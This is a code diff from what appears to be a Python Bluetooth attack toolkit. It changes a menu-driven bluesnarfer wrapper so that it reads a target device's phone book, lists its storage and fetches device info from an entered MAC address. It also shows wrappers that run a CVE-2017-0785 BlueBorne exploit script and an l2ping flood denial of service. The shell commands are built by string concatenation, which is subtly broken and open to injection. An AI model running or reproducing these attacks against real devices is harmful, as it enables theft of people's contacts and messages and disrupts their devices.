@@ -45,22 +45,25 @@ def bluesnarfer(mode):
     mac = input("\n\nWrite target MAC address: ")
     mc = input("Write target channel for messages: ")
     pbc = input("Write target channel for phone book: ")
+    dc = 2
 
     if "list" in mode:
-        return 0
-    elif "messages" in mode:
-        return 1
+        os.system("sudo bluesnarfer -b "" " + mac + " -C " + pbc + " -l")
+    if "default_list" in mode:
+        os.system("sudo bluesnarfer -b "" " + mac + " -C " + dc + " -l")
+    elif "info" in mode:
+        os.system("bluesnarfer -i -b " + mac)
     elif "pb" in mode:
-        return 2
+        os.system("sudo bluesnarfer -b "" " + mac + " -r 1-100 -C " + pbc + " ME")
     else:
         print("Invalid option.")
-        return -1
 
 def blueborne():
     mac = input("Write target MAC address: ")
     os.system("sudo python3 CVE-2017-0785.py TARGET=" + mac)
 
-def DoS(seq, size, mac):
+def DoS(seq, size):
+    mac = input("Write target MAC address: ")
     subprocess.run(["sudo", "seq", seq, ">", "numberofpings"], stdout=subprocess.DEVNULL)
     os.system("while read r; do l2ping -s " + size + " " + mac + "; done < numberofpings")
 
@@ -104,11 +107,12 @@ def main():
         elif "5" in action:
             jieggi_DoS()
         elif "6" in action:
-            print(bluesnarfer())
+            mode = input("\n\nChoose action: ")
+            bluesnarfer(mode)
         elif "7" in action:
             blueborne()
         elif "8" in action:
-            DoS()
+            DoS(100, 600)
         elif "quit" in action:
             bye()
         else:
